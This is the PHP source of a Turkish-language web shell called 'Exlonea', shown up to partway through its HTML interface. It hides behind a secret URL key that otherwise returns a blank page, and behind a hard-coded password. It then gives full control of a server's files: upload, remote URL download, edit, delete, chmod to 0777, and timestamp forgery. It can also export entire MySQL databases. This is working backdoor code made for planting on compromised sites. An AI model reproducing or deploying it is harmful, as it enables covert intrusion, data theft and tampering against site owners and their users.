<?php
error_reporting(0);
set_time_limit(0);
@chmod(__FILE__, 0777);
session_start();

$PASSWORD = '445566';
$KEY_PARAM = 'exlonea';

$AUTH_FAILED = false;
$key_is_present = isset($_GET['key']) && $_GET['key'] === $KEY_PARAM;

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . basename(__FILE__));
    exit;
}

if (!$key_is_present) {
    echo '<!DOCTYPE html><html lang="tr"><head><meta charset="UTF-8"></head><body></body></html>';
    exit;
}

if (isset($_POST['password'])) {
    if ($_POST['password'] === $PASSWORD) {
        $_SESSION['authenticated'] = true;
        $currentDir = realpath(isset($_GET['dir']) ? $_GET['dir'] : getcwd()) ?: getcwd();
        header("Location: ?dir=" . urlencode($currentDir) . "&key=" . $KEY_PARAM);
        exit;
    } else {
        $AUTH_FAILED = true;
    }
}

if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    $error = $AUTH_FAILED ? "Hatalı şifre!" : "";
    echo '<!DOCTYPE html><html lang="tr"><head><meta charset="UTF-8"><title>Giriş</title><meta name="viewport" content="width=device-width, initial-scale=1.0"><link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet"><link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet"><style>body { background-color: #f8f9fa; display: flex; justify-content: center; align-items: center; min-height: 100vh; } .login-box { width: 100%; max-width: 330px; padding: 15px; margin: auto; border: 1px solid #ccc; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); background-color: #fff; } .login-icon { font-size: 3rem; color: #007bff; margin-bottom: 1rem; } @media (max-width: 576px) { .login-box { margin: 15px; } }</style></head><body><div class="login-box"><div class="text-center"><i class="bi bi-lock-fill login-icon"></i><h2 class="text-center mb-4">Giriş Yap</h2></div><form method="POST"><div class="mb-3"><input type="password" class="form-control" name="password" placeholder="Şifre" required></div><button type="submit" class="btn btn-primary w-100"><i class="bi bi-box-arrow-in-right"></i> Giriş Yap</button>' . ($error ? '<div class="alert alert-danger mt-3">' . $error . '</div>' : '') . '</form></div><script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script></body></html>';
    exit;
}

if (!function_exists('unlink')) {
    function unlink($filename, $context = null) {
        return false;
    }
}

$baseDir = realpath(getcwd());
$scriptName = basename(__FILE__);

function getFileList($dir) {
    $files = array();
    $dirs = array();
    if (!is_dir($dir)) return array_merge($dirs, $files);
    $items = @scandir($dir);
    if ($items === false) return array_merge($dirs, $files);

    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;

        $path = $dir . DIRECTORY_SEPARATOR . $item;
        $perms = fileperms($path) & 0777;
        $permStr = sprintf('%o', $perms);

        $entry = array(
            'name' => $item,
            'path' => $path,
            'type' => is_dir($path) ? 'dir' : 'file',
            'size' => is_file($path) ? filesize($path) : 0,
            'mtime' => @filemtime($path),
            'icon' => is_dir($path) ? 'bi bi-folder-fill text-warning' : getFileIcon($item),
            'perms' => $permStr
        );

        if (is_dir($path)) $dirs[] = $entry;
        else $files[] = $entry;
    }

    return array_merge($dirs, $files);
}

function getFileIcon($filename) {
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    $icons = array(
        'jpg' => 'bi bi-image', 'jpeg' => 'bi bi-image', 'png' => 'bi bi-image', 'gif' => 'bi bi-image',
        'php' => 'bi bi-file-code', 'html' => 'bi bi-file-code', 'css' => 'bi bi-file-code', 'js' => 'bi bi-file-code',
        'pdf' => 'bi bi-file-pdf', 'txt' => 'bi bi-file-text',
        'zip' => 'bi bi-file-zip-fill',
        'sql' => 'bi bi-file-earmark-database-fill text-info'
    );
    return $icons[$ext] ?? 'bi bi-file-earmark';
}

function formatSize($size) {
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    $size = max($size, 0);
    $pow = floor(($size ? log($size) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $size /= pow(1024, $pow);
    return round($size, 2) . ' ' . $units[$pow];
}

function zipFolder($source, $destination, $includeParentFolder = false) {
    if (!class_exists('ZipArchive')) return array('success' => false, 'error' => 'ZipArchive eklentisi yok!');
    $zip = new ZipArchive();
    if (!$zip->open($destination, ZIPARCHIVE::CREATE)) return array('success' => false, 'error' => 'Zip oluşturulamadı!');

    $source = str_replace('\\', '/', realpath($source));
    $parentFolderName = basename($source);

    if (is_dir($source)) {
        $files = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($source),
            RecursiveIteratorIterator::SELF_FIRST
        );

        foreach ($files as $file) {
            $file = str_replace('\\', '/', $file);
            if (in_array(substr($file, strrpos($file, '/') + 1), array('.', '..'))) continue;

            $file = realpath($file);
            
            if ($includeParentFolder) {
                $relativePath = $parentFolderName . '/' . str_replace($source . '/', '', $file);
            } else {
                $relativePath = str_replace($source . '/', '', $file);
            }

            if (is_dir($file)) {
                $zip->addEmptyDir($relativePath . '/');
            } elseif (is_file($file)) {
                $zip->addFromString($relativePath, file_get_contents($file));
            }
        }
    } elseif (is_file($source)) {
        $zip->addFromString(basename($source), file_get_contents($source));
    }

    $result = $zip->close();
    return array('success' => $result, 'error' => $result ? '' : 'Zipleme başarısız!');
}

function zipMultiple($files, $destination, $currentDir) {
    if (!class_exists('ZipArchive')) return array('success' => false, 'error' => 'ZipArchive eklentisi yok!');
    $zip = new ZipArchive();
    if (!$zip->open($destination, ZIPARCHIVE::CREATE)) return array('success' => false, 'error' => 'Zip oluşturulamadı!');

    $currentDirReal = realpath($currentDir);

    foreach ($files as $file) {
        $filePath = realpath($currentDir . DIRECTORY_SEPARATOR . $file);

        if ($filePath && strpos($filePath, $currentDirReal) === 0) {
            $filePath = str_replace('\\', '/', $filePath);

            if (is_dir($filePath)) {
                $iterator = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($filePath),
                    RecursiveIteratorIterator::SELF_FIRST
                );

                foreach ($iterator as $item) {
                    $item = str_replace('\\', '/', $item);
                    if (in_array(substr($item, strrpos($item, '/') + 1), array('.', '..')) || strpos($item, $currentDirReal) !== 0) continue;

                    $item = realpath($item);

                    if (is_dir($item)) {
                        $zip->addEmptyDir(str_replace($currentDirReal . '/', '', $item . '/'));
                    } elseif (is_file($item)) {
                        $zip->addFromString(str_replace($currentDirReal . '/', '', $item), file_get_contents($item));
                    }
                }
            } elseif (is_file($filePath)) {
                $zip->addFromString($file, file_get_contents($filePath));
            }
        }
    }

    $result = $zip->close();
    return array('success' => $result, 'error' => $result ? '' : 'Toplu zipleme başarısız!');
}

function searchFiles($dir, $query) {
    $results = array();
    $files = getFileList($dir);

    foreach ($files as $file) {
        if (stripos($file['name'], $query) !== false) {
            $results[] = $file;
        }
    }
    return $results;
}

function getBreadcrumb($dir) {
    global $baseDir;
    $parts = explode(DIRECTORY_SEPARATOR, realpath($dir));
    $baseParts = explode(DIRECTORY_SEPARATOR, $baseDir);
    $breadcrumb = array();
    $currentPath = '';

    foreach ($parts as $part) {
        if ($part === '') continue;
        $currentPath .= DIRECTORY_SEPARATOR . $part;
        $breadcrumb[] = array('name' => $part, 'path' => $currentPath);
    }
    return $breadcrumb;
}

function deleteRecursive($path) {
    if (!file_exists($path)) return false;
    if (is_dir($path)) {
        $items = @scandir($path);
        if ($items !== false) {
            foreach ($items as $item) {
                if ($item === '.' || $item === '..') continue;
                deleteRecursive($path . DIRECTORY_SEPARATOR . $item);
            }
            return @rmdir($path);
        }
        return false;
    } elseif (is_file($path)) {
        return @unlink($path);
    }
    return false;
}

function copyDirectory($source, $destination) {
    if (!is_dir($destination)) {
        @mkdir($destination, 0777, true);
    }
    $dir = opendir($source);
    while (($file = readdir($dir)) !== false) {
        if ($file != '.' && $file != '..') {
            if (is_dir($source . DIRECTORY_SEPARATOR . $file)) {
                copyDirectory($source . DIRECTORY_SEPARATOR . $file, $destination . DIRECTORY_SEPARATOR . $file);
            } else {
                @copy($source . DIRECTORY_SEPARATOR . $file, $destination . DIRECTORY_SEPARATOR . $file);
            }
        }
    }
    closedir($dir);
}

function getServerFileUrl($filePath) {
    global $baseDir;
    $documentRoot = realpath($_SERVER['DOCUMENT_ROOT']);

    if ($documentRoot && strpos($filePath, $documentRoot) === 0) {
        $relativePath = str_replace($documentRoot, '', $filePath);
        $scheme = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' || isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https') ? 'https' : 'http';
        return $scheme . '://' . $_SERVER['HTTP_HOST'] . str_replace('\\', '/', $relativePath);
    }

    return false;
}

$action = $_GET['action'] ?? '';
$currentDir = realpath($_GET['dir'] ?? getcwd()) ?: getcwd();
$error = '';
$success = '';
$fileToEdit = isset($_GET['file_to_edit']) ? $_GET['file_to_edit'] : null;

if ($action === 'get_file_content' && isset($_GET['file'])) {
    $file = realpath($currentDir . DIRECTORY_SEPARATOR . $_GET['file']);

    if ($file && is_file($file) && strpos($file, realpath($currentDir)) === 0) {
        $content = @file_get_contents($file);
        if ($content !== false) {
            header('Content-Type: application/json');
            echo json_encode([
                'content' => $content,
                'perms' => sprintf('%o', fileperms($file) & 0777),
                'mtime' => date('Y-m-d H:i:s', filemtime($file)),
                'url' => getServerFileUrl($file) ?: ''
            ]);
        } else {
            header('Content-Type: application/json', true, 500);
            echo json_encode(['error' => 'Dosya içeriği alınamadı!']);
        }
    } else {
        header('Content-Type: application/json', true, 404);
        echo json_encode(['error' => 'Dosya bulunamadı!']);
    }
    exit;
}

if ($action === 'upload' && isset($_POST['upload_type'])) {
    $uploadDir = $currentDir;
    
    if (isset($_POST['create_folder_on_upload']) && $_POST['create_folder_on_upload'] === 'yes' && !empty($_POST['upload_folder_name'])) {
        $folderName = $_POST['upload_folder_name'];
        $uploadDir = $currentDir . DIRECTORY_SEPARATOR . $folderName;
        if (!file_exists($uploadDir)) {
            @mkdir($uploadDir, 0777, true);
        }
    }

    if ($_POST['upload_type'] === 'file' && isset($_FILES['uploaded_files']) && !empty($_FILES['uploaded_files']['name'][0])) {
        foreach ($_FILES['uploaded_files']['name'] as $key => $name) {
            $targetFile = $uploadDir . DIRECTORY_SEPARATOR . basename($name);
            if (move_uploaded_file($_FILES['uploaded_files']['tmp_name'][$key], $targetFile)) {
                @chmod($targetFile, 0777);
                $fullUrl = getServerFileUrl($targetFile);
                $success .= 'Yüklendi: <a href="' . $fullUrl . '" target="_blank">' . htmlspecialchars(basename($name)) . '</a><br>';
            } else {
                $error .= 'Yüklenemedi: ' . htmlspecialchars(basename($name)) . '<br>';
            }
        }
    } elseif ($_POST['upload_type'] === 'url' && !empty($_POST['urls'])) {
        $urls = explode("\n", $_POST['urls']);
        foreach ($urls as $url) {
            $url = trim($url);
            if (filter_var($url, FILTER_VALIDATE_URL)) {
                $fileName = $uploadDir . DIRECTORY_SEPARATOR . basename(parse_url($url, PHP_URL_PATH));
                $fileName = $fileName ?: $uploadDir . DIRECTORY_SEPARATOR . 'downloaded_file_' . time() . '_' . mt_rand();

                $content = @file_get_contents($url);

                if ($content !== false && file_put_contents($fileName, $content)) {
                    @chmod($fileName, 0777);
                    $fullUrl = getServerFileUrl($fileName);
                    $success .= 'İndirildi: <a href="' . $fullUrl . '" target="_blank">' . htmlspecialchars(basename($fileName)) . '</a><br>';
                } else {
                    $error .= 'İndirilemedi: ' . $url . '<br>';
                }
            } else {
                $error .= 'Geçersiz URL: ' . $url . '<br>';
            }
        }
    } else {
        $error = 'Dosya veya URL giriniz!';
    }
}

if ($action === 'delete' && isset($_POST['files'])) {
    $files = is_array($_POST['files']) ? $_POST['files'] : [$_POST['files']];
    $deleted = [];

    foreach ($files as $file) {
        $filePath = realpath($currentDir . DIRECTORY_SEPARATOR . $file);
        if ($filePath && file_exists($filePath) && strpos($filePath, realpath($currentDir)) === 0) {
            if (deleteRecursive($filePath)) {
                $deleted[] = htmlspecialchars($file);
            } else {
                $error .= 'Silinemedi: ' . htmlspecialchars($file) . '<br>';
            }
        } else {
            $error .= 'Bulunamadı: ' . htmlspecialchars($file) . '<br>';
        }
    }

    if ($deleted) $success = 'Silindi: ' . implode(', ', $deleted);
    else $error = 'Silme hatası!';
}

if ($action === 'rename' && isset($_POST['old_name'], $_POST['new_name'])) {
    $oldPath = realpath($currentDir . DIRECTORY_SEPARATOR . $_POST['old_name']);
    $newPath = realpath($currentDir) . DIRECTORY_SEPARATOR . $_POST['new_name'];

    if ($oldPath && strpos($oldPath, realpath($currentDir)) === 0 && !file_exists($newPath)) {
        $success = @rename($oldPath, $newPath) ? 'Ad değiştirildi: ' . htmlspecialchars($_POST['new_name']) : 'Ad değiştirilemedi!';
        if ($success) @chmod($newPath, 0777);
    } else {
        $error = 'Adlandırma hatası!';
    }
}

if ($action === 'move' && isset($_POST['files'], $_POST['destination'])) {
    $files = is_array($_POST['files']) ? $_POST['files'] : [$_POST['files']];
    $moved = [];
    $destDir = realpath($_POST['destination']);

    if ($destDir && strpos($destDir, realpath($baseDir)) === 0) {
        foreach ($files as $file) {
            $filePath = realpath($currentDir . DIRECTORY_SEPARATOR . $file);
            $dest = $destDir . DIRECTORY_SEPARATOR . basename($file);

            if ($filePath && !file_exists($dest) && strpos($filePath, realpath($currentDir)) === 0) {
                if (@rename($filePath, $dest)) {
                    $moved[] = htmlspecialchars(basename($file));
                    @chmod($dest, 0777);
                } else {
                    $error .= 'Taşınamadı: ' . htmlspecialchars($file) . '<br>';
                }
            } else {
                if (file_exists($dest)) {
                    $error .= 'Hedefte mevcut: ' . htmlspecialchars($dest) . '<br>';
                } else {
                    $error .= 'Geçersiz kaynak: ' . htmlspecialchars($file) . '<br>';
                }
            }
        }
        $success = $moved ? 'Taşındı: ' . implode(', ', $moved) : ($error ? $error : 'Taşıma başarısız!');
    } else {
        $error = 'Geçersiz hedef!';
    }
}

if ($action === 'copy' && isset($_POST['files'], $_POST['destination'])) {
    $files = is_array($_POST['files']) ? $_POST['files'] : [$_POST['files']];
    $copied = [];
    $destDir = realpath($_POST['destination']);

    if ($destDir && strpos($destDir, realpath($baseDir)) === 0) {
        foreach ($files as $file) {
            $filePath = realpath($currentDir . DIRECTORY_SEPARATOR . $file);
            $dest = $destDir . DIRECTORY_SEPARATOR . basename($file);

            if ($filePath && !file_exists($dest) && strpos($filePath, realpath($currentDir)) === 0) {
                if (is_dir($filePath)) {
                    copyDirectory($filePath, $dest);
                    $copied[] = htmlspecialchars(basename($file));
                    @chmod($dest, 0777);
                } elseif (is_file($filePath)) {
                    if (@copy($filePath, $dest)) {
                        $copied[] = htmlspecialchars(basename($file));
                        @chmod($dest, 0777);
                    } else {
                        $error .= 'Kopyalanamadı: ' . htmlspecialchars($file) . '<br>';
                    }
                }
            } else {
                if (file_exists($dest)) {
                    $error .= 'Hedefte mevcut: ' . htmlspecialchars($dest) . '<br>';
                } else {
                    $error .= 'Geçersiz kaynak: ' . htmlspecialchars($file) . '<br>';
                }
            }
        }
        $success = $copied ? 'Kopyalandı: ' . implode(', ', $copied) : ($error ? $error : 'Kopyalama başarısız!');
    } else {
        $error = 'Geçersiz hedef!';
    }
}

if ($action === 'download' && isset($_POST['files'])) {
    $files = is_array($_POST['files']) ? $_POST['files'] : [$_POST['files']];
    
    if (count($files) === 1) {
        $firstFile = realpath($currentDir . DIRECTORY_SEPARATOR . $files[0]);

        if ($firstFile && strpos($firstFile, realpath($currentDir)) === 0) {
            if (is_file($firstFile)) {
                header('Content-Description: File Transfer');
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename="' . basename($firstFile) . '"');
                header('Expires: 0');
                header('Cache-Control: must-revalidate');
                header('Pragma: public');
                header('Content-Length: ' . filesize($firstFile));
                readfile($firstFile);
                exit;
            } elseif (is_dir($firstFile)) {
                $zipName = basename($firstFile) . '.zip';
                $zipPath = tempnam(sys_get_temp_dir(), 'zip_');
                $result = zipFolder($firstFile, $zipPath, true);
                
                if ($result['success']) {
                    header('Content-Type: application/zip');
                    header('Content-Disposition: attachment; filename="' . $zipName . '"');
                    header('Content-Length: ' . filesize($zipPath));
                    readfile($zipPath);
                    @unlink($zipPath);
                    exit;
                } else {
                    $error = $result['error'];
                }
            } else {
                $error = 'Geçersiz dosya türü!';
            }
        } else {
            $error = 'İndirme hatası!';
        }
    } else {
        $zipName = $_SERVER['HTTP_HOST'] . '.zip';
        $zipPath = tempnam(sys_get_temp_dir(), 'zip_');
        $result = zipMultiple($files, $zipPath, $currentDir);

        if ($result['success']) {
            header('Content-Type: application/zip');
            header('Content-Disposition: attachment; filename="' . $zipName . '"');
            header('Content-Length: ' . filesize($zipPath));
            readfile($zipPath);
            @unlink($zipPath);
            exit;
        } else {
            $error = $result['error'];
        }
    }
}

if ($action === 'sunucuyaziple' && isset($_POST['files'])) {
    $files = is_array($_POST['files']) ? $_POST['files'] : [$_POST['files']];

    if (count($files) === 1) {
        $file = realpath($currentDir . DIRECTORY_SEPARATOR . $files[0]);
        if ($file && strpos($file, realpath($currentDir)) === 0) {
            $zipName = basename($file) . '.zip';
            $zipPath = $currentDir . DIRECTORY_SEPARATOR . $zipName;
            $result = zipFolder($file, $zipPath, is_dir($file));
            
            if ($result['success']) {
                @chmod($zipPath, 0777);
                $success = 'Sunucuya ziplendi: ' . htmlspecialchars($zipName);
            } else {
                $error = $result['error'];
            }
        } else {
            $error = 'Geçersiz yol!';
        }
    } else {
        $zipName = $_SERVER['HTTP_HOST'] . '.zip';
        $zipPath = $currentDir . DIRECTORY_SEPARATOR . $zipName;
        $result = zipMultiple($files, $zipPath, $currentDir);
        
        if ($result['success']) {
            @chmod($zipPath, 0777);
            $success = 'Sunucuya ziplendi: ' . htmlspecialchars($zipName);
        } else {
            $error = $result['error'];
        }
    }
}

if ($action === 'edit' && isset($_POST['file']) && isset($_POST['content'])) {
    $file = realpath($currentDir . DIRECTORY_SEPARATOR . $_POST['file']);

    if ($file && is_file($file) && strpos($file, realpath($currentDir)) === 0) {
        $content = $_POST['content'];
        $bytesWritten = @file_put_contents($file, $content);

        if ($bytesWritten !== false) {
            @chmod($file, 0777);
            $success = 'Kaydedildi: ' . htmlspecialchars($_POST['file']) . ' (' . $bytesWritten . ' bayt)';
        } else {
            $error = 'Kaydedilemedi!';
        }
    } else {
        $error = 'Geçersiz dosya!';
    }
}

if ($action === 'create_folder' && isset($_POST['folder_name'])) {
    $folderPath = $currentDir . DIRECTORY_SEPARATOR . $_POST['folder_name'];

    if (!file_exists($folderPath)) {
        if (@mkdir($folderPath, 0777, true)) {
            $success = 'Klasör oluşturuldu: ' . htmlspecialchars($_POST['folder_name']);
        } else {
            $error = 'Klasör oluşturulamadı!';
        }
    } else {
        $error = 'Klasör zaten var!';
    }
}

if ($action === 'create_file' && isset($_POST['file_name'])) {
    $fileName = $_POST['file_name'];
    $filePath = $currentDir . DIRECTORY_SEPARATOR . $fileName;

    if (!file_exists($filePath)) {
        if (@touch($filePath)) {
            if (file_put_contents($filePath, '') !== false) {
                @chmod($filePath, 0777);
                // Dosya oluşturulduktan sonra direkt düzenleme moduna geçmek için yönlendir
                header("Location: ?dir=" . urlencode($currentDir) . "&key=" . $KEY_PARAM . "&file_to_edit=" . urlencode($fileName));
                exit;
            } else {
                $error = 'Dosya yazılamadı!';
                @unlink($filePath);
            }
        } else {
            $error = 'Dosya oluşturulamadı!';
        }
    } else {
        $error = 'Dosya zaten var!';
    }
}

if ($action === 'chmod' && isset($_POST['file']) && isset($_POST['perms'])) {
    $file = realpath($currentDir . DIRECTORY_SEPARATOR . $_POST['file']);
    $perms = octdec($_POST['perms']);

    if ($file && strpos($file, realpath($currentDir)) === 0) {
        if (@chmod($file, $perms)) {
            $success = 'İzinler güncellendi: ' . htmlspecialchars($_POST['file']) . ' -> ' . $_POST['perms'];
        } else {
            $error = 'İzinler güncellenemedi!';
        }
    } else {
        $error = 'Geçersiz dosya!';
    }
}

if ($action === 'touch' && isset($_POST['file']) && isset($_POST['mtime'])) {
    $file = realpath($currentDir . DIRECTORY_SEPARATOR . $_POST['file']);
    $mtime = strtotime($_POST['mtime']);

    if ($file && strpos($file, realpath($currentDir)) === 0) {
        if (@touch($file, $mtime)) {
            $success = 'Tarih güncellendi: ' . htmlspecialchars($_POST['file']) . ' -> ' . date('Y-m-d H:i:s', $mtime);
        } else {
            $error = 'Tarih güncellenemedi!';
        }
    } else {
        $error = 'Geçersiz dosya!';
    }
}

if ($action === 'database_export' && isset($_POST['host'], $_POST['user'], $_POST['pass'], $_POST['db'])) {
    try {
        if (!class_exists('mysqli')) throw new Exception("MySQLi yok!");

        $host = $_POST['host'];
        $user = $_POST['user'];
        $pass = $_POST['pass'];
        $db   = $_POST['db'];

        $conn = new mysqli($host, $user, $pass, $db);
        if ($conn->connect_error) {
            throw new Exception("Bağlantı hatası: " . $conn->connect_error);
        }

        $filename = preg_replace('/[^a-zA-Z0-9_]/', '', $db) . '_' . date('Y-m-d_H-i-s');
        $sql_file = $currentDir . DIRECTORY_SEPARATOR . $filename . '.sql';

        $fp = @fopen($sql_file, 'w');
        if (!$fp) {
            throw new Exception("SQL dosyası oluşturulamadı!");
        }

        $tables = array();
        $result = $conn->query("SHOW TABLES");
        while ($row = $result->fetch_array()) {
            $tables[] = $row[0];
        }

        foreach ($tables as $table) {
            fwrite($fp, "-- Table: `$table`\n");
            fwrite($fp, "DROP TABLE IF EXISTS `$table`;\n");
            
            $result = $conn->query("SHOW CREATE TABLE `$table`");
            $row = $result->fetch_array();
            fwrite($fp, $row[1] . ";\n\n");
            
            $result = $conn->query("SELECT * FROM `$table`");
            while ($row = $result->fetch_array(MYSQLI_ASSOC)) {
                $values = array_map(function ($v) use ($conn) {
                    return is_null($v) ? 'NULL' : "'" . $conn->real_escape_string($v) . "'";
                }, $row);
                fwrite($fp, "INSERT INTO `$table` VALUES (" . implode(",", $values) . ");\n");
            }
            fwrite($fp, "\n\n");
        }

        @fclose($fp);
        $conn->close();

        if (file_exists($sql_file)) {
            $fileSize = filesize($sql_file);
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($sql_file) . '"');
            header('Content-Length: ' . $fileSize);
            readfile($sql_file);
            @unlink($sql_file);
            exit;
        } else {
            throw new Exception("SQL dosyası oluşturulamadı!");
        }

    } catch (Exception $e) {
        $error = 'Veritabanı Export Hatası: ' . $e->getMessage();
    }
}

if ($action === 'search' && isset($_GET['query'])) {
    $files = searchFiles($currentDir, $_GET['query']);
} else {
    $files = getFileList($currentDir);
}

?>

<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Exlonea</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Cinzel+Decorative:wght@400&display=swap" rel="stylesheet">
    <!-- Highlight.js CSS eklendi - syntax highlighting için -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/vs2015.min.css" id="highlightTheme">
    <style>
        body { background-color: #f8f9fa; }
        .table { font-size: 14px; }
        .modal-body input, .modal-body textarea { width: 100%; }
        h2 { font-family: 'Cinzel Decorative', cursive; font-weight: 400; }
        .breadcrumb a { text-decoration: none; }
        .footer { color: #6c757d; text-align: center; margin-top: 20px; }
        .file-icon { margin-right: 10px; } 
        .button-group { margin-bottom: 15px; display: flex; gap: 10px; flex-wrap: wrap; }
        .button-group button, .button-group a { min-width: 150px; }
        .table-responsive { max-height: 400px; overflow-y: auto; display: block; }
        .modal-dialog { max-width: 90%; }
        .table td:first-child, .table th:first-child { padding-left: 10px; text-align: left; width: 5%; }
        .header-icons { position: absolute; top: 10px; right: 10px; display: flex; gap: 10px; }
        .header-icons i { cursor: pointer; font-size: 24px; color: #343a40; }
        .header-icons i:hover { color: #007bff; }
        .self-highlight { color: red !important; font-weight: bold; }
        .btn-custom { background-color: #007bff; border-color: #007bff; color: #ffffff !important; }
        .btn-custom:hover, .btn-custom:focus, .btn-custom:active, .btn-custom.show { 
            background-color: #0056b3 !important; 
            border-color: #004085 !important; 
            color: #ffffff !important; 
            box-shadow: none; 
        }
        .btn-green { background-color: #28a745; border-color: #28a745; color: #ffffff !important; }
        .btn-green:hover, .btn-green:focus, .btn-green:active, .btn-green.show { 
            background-color: #1e7e34 !important; 
            border-color: #1c7430 !important; 
            color: #ffffff !important; 
            box-shadow: none;
        }
        /* Editor container stilleri güncellendi - syntax highlighting desteği */
        .editor-container {
            display: flex;
            height: 50vh;
            border: 1px solid #ccc;
            overflow: hidden;
            position: relative;
            background-color: #1e1e1e;
        }
        .editor-container.light-mode {
            background-color: #ffffff;
        }
        .line-numbers {
            width: 50px;
            padding: 10px 5px;
            text-align: right;
            background-color: #252525;
            color: #858585;
            font-size: 14px;
            overflow: hidden;
            flex-shrink: 0;
            user-select: none;
            line-height: 1.5;
            font-family: 'Courier New', monospace;
        }
        .editor-container.light-mode .line-numbers {
            background-color: #f5f5f5;
            color: #999;
        }
        .line-number-line {
            padding-right: 5px;
            white-space: pre;
        }
        .code-textarea {
            flex-grow: 1;
            padding: 10px;
            border: none;
            resize: none;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            line-height: 1.5;
            white-space: pre;
            word-wrap: normal;
            overflow: auto;
            background-color: transparent;
            color: #d4d4d4;
            position: absolute;
            top: 0;
            left: 50px;
            right: 0;
            bottom: 0;
            z-index: 2;
            caret-color: #d4d4d4;
        }
        .editor-container.light-mode .code-textarea {
            color: #000;
            caret-color: #000;
        }
        .code-preview {
            flex-grow: 1;
            padding: 10px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            line-height: 1.5;
            white-space: pre;
            word-wrap: normal;
            overflow: auto;
            background-color: transparent;
            position: absolute;
            top: 0;
            left: 50px;
            right: 0;
            bottom: 0;
            z-index: 1;
            pointer-events: none;
        }
        .code-preview pre {
            margin: 0;
            padding: 0;
            background: transparent !important;
        }
        .code-preview code {
            font-family: 'Courier New', monospace;
            font-size: 14px;
            line-height: 1.5;
            background: transparent !important;
            padding: 0 !important;
        }
        /* Tema toggle butonu icon stili */
        .theme-toggle-btn {
            font-size: 20px;
            padding: 8px 12px;
            border-radius: 5px;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        .theme-toggle-btn:hover {
            transform: scale(1.1);
        }
        .edit-actions {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            justify-content: flex-start;
            padding: 15px;
            border-top: 1px solid #dee2e6;
        }
        .dropdown-menu-fit-scroll {
            min-width: 250px; 
            max-height: 300px; 
            overflow-y: auto;
            overflow-x: hidden; 
        }
        .breadcrumb-copy-btn {
            cursor: pointer;
            color: #007bff;
            margin-left: 10px;
            transition: color 0.2s;
        }
        .breadcrumb-copy-btn:hover {
            color: #0056b3;
        }
        .toast-container {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 9999;
        }
        .hash-result {
            background: #f8f9fa;
            padding: 10px;
            border-radius: 5px;
            margin-bottom: 10px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .hash-result code {
            word-break: break-all;
            flex-grow: 1;
        }
        .hash-result button {
            margin-left: 10px;
            flex-shrink: 0;
        }
        .hash-results-container {
            max-height: 400px;
            overflow-y: auto;
        }
    </style>
</head>
<body>
    <div class="toast-container"></div>
    
    <div class="container mt-4">
        <h2><a href="?dir=<?php echo urlencode($baseDir); ?>&key=<?php echo $KEY_PARAM; ?>" style="text-decoration:none;color:inherit;">eXlONeA</a></h2>
        <div class="header-icons">
            <i class="bi bi-house-door-fill" title="Ana Dizin" onclick="window.location.href='?dir=<?php echo urlencode($baseDir); ?>&key=<?php echo $KEY_PARAM; ?>'"></i>
            <i class="bi bi-box-arrow-right text-danger" title="Çıkış Yap" onclick="window.location.href='?logout=true'"></i>
        </div>
        
        <nav aria-label="breadcrumb">
            <ol class="breadcrumb">
                <?php foreach (getBreadcrumb($currentDir) as $crumb) { ?>
                    <li class="breadcrumb-item">
                        <a href="?dir=<?php echo urlencode($crumb['path']); ?>&key=<?php echo $KEY_PARAM; ?>"><?php echo htmlspecialchars($crumb['name']); ?></a>
                    </li>
                <?php } ?>
                <i class="bi bi-clipboard breadcrumb-copy-btn" title="Dizini Kopyala" onclick="copyCurrentPath('<?php echo htmlspecialchars($currentDir); ?>')"></i>
            </ol>
        </nav>

        <?php if ($error): ?>
            <div class="alert alert-danger alert-dismissible fade show" role="alert">
                <i class="bi bi-info-circle"></i> <?php echo $error; ?>
                <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
            </div>
        <?php endif; ?>

        <?php if ($success): ?>
            <div class="alert alert-success alert-dismissible fade show" role="alert">
                <i class="bi bi-info-circle"></i> <?php echo $success; ?>
                <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
            </div>
        <?php endif; ?>

        <div class="mb-3 button-group">
            <div class="dropdown">
                <button class="btn btn-custom dropdown-toggle" type="button" id="actionsMenu" data-bs-toggle="dropdown" aria-expanded="false">
                    <i class="bi bi-list-stars"></i> İşlemler
                </button>
                <ul class="dropdown-menu dropdown-menu-fit-scroll" aria-labelledby="actionsMenu">
                    <li><a class="dropdown-item action-create-folder" href="#" data-bs-toggle="modal" data-bs-target="#createFolderModal"><i class="bi bi-folder-plus"></i> Yeni Klasör Oluştur</a></li>
